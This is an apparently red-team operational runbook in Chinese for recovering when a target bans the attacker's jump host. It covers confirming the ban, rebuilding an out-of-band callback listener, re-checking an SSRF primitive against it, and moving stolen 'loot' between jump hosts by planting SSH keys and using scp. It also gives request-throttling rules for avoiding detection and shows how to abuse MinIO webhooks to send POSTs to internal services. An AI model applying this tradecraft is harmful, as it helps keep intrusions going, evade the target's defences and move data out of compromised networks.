# 出口被封 → 换跳板 → 重建管线(2026-09-15/16 实测)

## 1. 判定:是"被目标拉黑",不是"自己断网"
| 检查 | 被目标拉黑的表现 |
|---|---|
| `curl -m 8 https://www.baidu.com` | 200 正常 |
| `ping 8.8.8.8` | 通,DNS 正常 |
| 到目标的任意端口(443 / 10000 / 28443) | **全部丢包/超时** |
| `ip route` / 监听端口 | 正常,监听器还在 |

⇒ 结论写法:**该跳板出口 IP 被目标侧封禁**(高频扫描触发),不是网络故障,也不是"目标挂了"。

## 2. 切换与重建(4 步,全在跳板间完成)
1. 换备用跳板(凭据常相同),确认新出口到目标可达:`curl -sI https://<目标>/` + 一个业务端口
2. **在新跳板重建 OOB 监听 `:80`**(`scripts/oob_listener.py`;`HTTP/1.0` + `Connection: close`;pidfile 常驻)
3. **用一条已知可用原语验证回连**:`convertUrl2Pdf`/回显原语把 URL 指向新跳板 → 监听器日志出现 `client=<目标出口IP>` 才算通道恢复(只有 `200 {"code":"1"} `不算)
4. 迁 loot:新跳板 `ssh-keygen` → 把新公钥追加进旧跳板 `~/.ssh/authorized_keys` → 跳板间 `scp -i <key> -r root@<旧跳板>:/path /root/mig/`
   - **不要经操作者本机中转**(违反"目标流量只走跳板"的纪律;文件搬运也走跳板间直连)
   - `scp: Connection closed` = 公钥没装上,先确认 `authorized_keys` 行数

## 3. 之后的降速纪律
- 同一脚本里前几个请求超时、后面又正常 = **平台侧间歇限速**;每请求间隔 ≥2s,批量前先单发探活
- 扫内网面时"只报有内容的响应":`200 + len=0` 基本是取数失败,不是"服务存在但空"
- 一旦再被封,重复 §1-§2,并把这次触发原因写进案卷(哪条脚本、什么频率)

## 4. 顺带确认的 POST 原语候选(对象存储)
- MinIO admin 可配 `notify_webhook:1 endpoint=http://<任意URL>` → MinIO 会向该 URL 发 **POST**(body 是事件 JSON,不可控)
  - 用途:① 验证"我们能否收到 POST" ② 若内网接口**从 query 参数取值**(如 Nacos `@RequestParam` 风格),则 URL 里带上参数即可打只吃 POST 的接口
  - **限制**:2024-08 分布式集群写完仍是 `enable=off`,**必须 `mc admin service restart`**(生产动作,先拿授权);同时没有该 ARN 时 `mc event add` 报 `destination ARN does not exist`
- 取 `mc` 二进制:旧跳板 `/tmp/lyc_loot/mc`(30MB)直接 scp;`dl.min.io/client/mc/release/linux-amd64/mc` 会 410
- "自定义更新源"链已废:`mc admin update --url` 在新版 mc 已无该 flag;`/minio/admin/v3/update?updateURL=` → `426 XMinioAdminVersionMismatch`(分布式模式)
